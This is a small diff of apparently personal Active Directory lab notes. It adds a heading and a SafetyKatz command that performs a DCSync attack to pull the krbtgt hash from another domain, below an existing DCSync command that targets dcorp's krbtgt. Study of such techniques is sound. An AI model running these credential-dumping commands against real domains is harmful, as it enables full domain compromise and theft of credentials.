@@ -51,3 +51,7 @@ Now use safetykatz to extract the hash of any user
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 ![[Pasted image 20231025125418.png]]
+### **DCSync attack to another domain using ktbTGT user**
+```cmd
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<TARGET DOMAIN>" "exit"
+```
